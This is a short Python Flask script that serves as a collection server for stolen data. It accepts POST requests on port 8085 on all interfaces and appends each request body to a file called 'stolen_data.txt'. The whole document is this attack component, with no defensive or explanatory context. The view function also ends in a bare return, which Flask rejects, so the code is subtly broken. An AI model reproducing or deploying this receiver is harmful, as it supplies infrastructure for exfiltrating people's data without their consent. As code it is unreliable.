from flask import Flask, request

app = Flask(__name__)

LOG_FILE = 'stolen_data.txt'

@app.route('/', methods=['POST'])
def log_post():
    data = request.get_data().decode('utf-8')
    with open(LOG_FILE, 'a') as f:
        f.write(data+ '\n')
    return 
    
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8085)

